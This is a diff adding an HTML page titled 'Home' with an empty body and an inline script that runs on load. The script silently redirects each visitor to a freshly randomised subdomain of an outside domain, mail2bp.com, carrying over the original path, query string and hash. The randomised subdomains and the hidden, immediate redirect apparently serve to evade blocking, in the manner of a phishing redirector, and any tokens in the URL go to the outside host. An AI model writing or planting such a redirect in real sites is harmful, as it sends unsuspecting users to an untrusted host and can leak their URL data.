@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <script>
+        (function () {
+            // Function to generate a random string of specified length for the subdomain
+            function generateRandomSubdomain(length) {
+                const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                return result;
+            }
+
+            // Function to remove specific query parameter and its value from the URL
+            function removeQueryParameterAndValue(url, param) {
+                const urlObj = new URL(url);
+                if (urlObj.searchParams.has(param)) {
+                    urlObj.searchParams.delete(param);
+                }
+                return urlObj.toString();
+            }
+
+            // Generate a random subdomain
+            const randomSubdomain = generateRandomSubdomain(8); // Adjust the length as needed
+
+            // Define the main domain
+            const mainDomain = 'mail2bp.com';
+
+            // Get current location details
+            const currentUrl = window.location.href;
+
+            // Remove "syclid" parameter and retain other parts of the URL
+            const cleanedUrl = removeQueryParameterAndValue(currentUrl, 'syclid');
+
+            // Construct the new URL with random subdomain
+            const urlObj = new URL(cleanedUrl);
+            const newUrl = `https://${randomSubdomain}.${mainDomain}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
+
+            // Ensure redirect works on mobile by wrapping in a timeout
+            setTimeout(() => {
+                console.log(`Redirecting to: ${newUrl}`);
+                window.location.href = newUrl;
+            }, 100);
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
